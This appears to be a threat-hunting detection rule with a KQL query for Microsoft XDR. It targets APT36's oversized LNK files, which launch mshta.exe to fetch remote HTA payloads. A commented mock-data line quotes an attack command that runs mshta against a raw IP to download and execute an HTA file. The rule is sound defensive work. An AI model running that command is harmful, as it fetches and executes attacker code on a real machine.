# Name
APT36 - Abnormal LNK File Execution via MSHTA

# Description
Detects the execution of an unusually large Windows Shortcut (LNK) file that triggers mshta.exe. APT36 uses LNK files inflated to ~2MB (containing embedded PDF structures) to masquerade as legitimate documents. When clicked, these shortcuts execute a command line that calls mshta.exe to fetch a remote HTA payload.

# References
- https://www.cyfirma.com/research/apt36-multi-stage-lnk-malware-campaign-targeting-indian-government-entities/
- https://www.esecurityplanet.com/threats/apt36-uses-malicious-windows-shortcuts-to-target-indian-government/

# Author
M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- APT36
- Transparent Tribe

# MITRE ATT&CK
- T1204.002 - User Execution: Malicious File
- T1218.005 - System Binary Proxy Execution: Mshta
- T1036.005 - Masquerading: Match Legitimate Name or Location

# Data Sources
- Microsoft XDR
  - DeviceProcessEvents
  - DeviceFileEvents

# Query

## Query 1: MSHTA Execution from LNK/Explorer
This query looks for mshta.exe being spawned where the command line indicates it's processing a local or remote HTA, specifically focusing on the parent being explorer.exe (user click).

```
// Mock data for testing
// let DeviceProcessEvents = datatable(Timestamp:datetime, DeviceName:string, FileName:string, ProcessCommandLine:string, InitiatingProcessFileName:string)["2025-12-30", "DESKTOP-IND01","mshta.exe", "mshta.exe http://94.156.65.114/Online_JLPT_Exam.hta", "explorer.exe"];
DeviceProcessEvents
// Filter for MSHTA execution
| where FileName =~ "mshta.exe"
// Look for HTA triggers in command line
| where ProcessCommandLine has_any (".hta", "http://", "https://")
// Focus on user-initiated execution from Explorer
| where InitiatingProcessFileName =~ "explorer.exe"
// Filter out common legitimate local HTA uses if they exist in your environment
| where not ( ProcessCommandLine has_any ("CCM", "Microsoft Endpoint") ) 
```
